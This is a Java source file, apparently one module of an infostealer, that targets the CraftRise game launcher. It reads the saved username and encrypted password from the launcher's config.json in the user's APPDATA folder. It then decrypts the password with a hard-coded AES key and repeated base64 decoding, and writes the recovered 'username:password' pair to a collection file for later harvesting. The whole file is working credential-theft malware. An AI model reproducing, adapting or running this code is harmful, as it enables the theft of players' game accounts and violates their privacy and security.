package itzgonza.hollyshit.impl.game;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import itzgonza.hollyshit.utils.utilities;

public class CraftRise extends utilities {

    private static final String KEY = "2640023187059250";

    public void initialize() throws Exception {
        File configFile = new File(System.getenv("APPDATA"), "/.craftrise/config.json");
        if (!configFile.exists()) return;

        String jsonContent = FileUtils.readFileToString(configFile, StandardCharsets.UTF_8);
        JsonObject obj = JsonParser.parseString(jsonContent).getAsJsonObject();
        
        String username = obj.get("rememberName").getAsString();
        String encryptedPassword = obj.get("rememberPass").getAsString();
        
        if (username == null || username.isEmpty() || encryptedPassword == null || encryptedPassword.isEmpty()) return;
        
        String password = decryptCraftRise(encryptedPassword);
        
        if (password != null && !password.isEmpty()) {
            accountInfo = username + ":" + password;
            File outputFile = new File(getFolder() + "/game/craftrise/acc.txt");
            outputFile.getParentFile().mkdirs();
            FileUtils.writeStringToFile(outputFile, accountInfo + "\n", StandardCharsets.UTF_8, true);
            content.add("craftrise");
        }
    }
    
    public static String accountInfo = null;
    
    private String decryptCraftRise(String encryptedPassword) {
        try {
            // First decode - AES decrypt
            byte[] keyBytes = KEY.getBytes(StandardCharsets.UTF_8);
            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
            
            byte[] encryptedData = Base64.getDecoder().decode(encryptedPassword);
            Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            
            byte[] decrypted = cipher.doFinal(encryptedData);
            
            // Remove PKCS5 padding
            int paddingLength = decrypted[decrypted.length - 1];
            String decryptedStr = new String(decrypted, 0, decrypted.length - paddingLength, StandardCharsets.UTF_8);
            
            // Double base64 decode with replacements
            for (int i = 0; i < 2; i++) {
                try {
                    String decoded = new String(Base64.getDecoder().decode(decryptedStr), StandardCharsets.UTF_8);
                    decoded = decoded.replace("3ebi2mclmAM7Ao2", "").replace("KweGTngiZOOj9d6", "");
                    decryptedStr = decoded;
                } catch (Exception e) {
                    break;
                }
            }
            
            // Final base64 decode and split by #
            String finalPassword = new String(Base64.getDecoder().decode(decryptedStr), StandardCharsets.UTF_8);
            if (finalPassword.contains("#")) {
                finalPassword = finalPassword.split("#")[0];
            }
            
            return finalPassword;
        } catch (Exception e) {
            return null;
        }
    }
}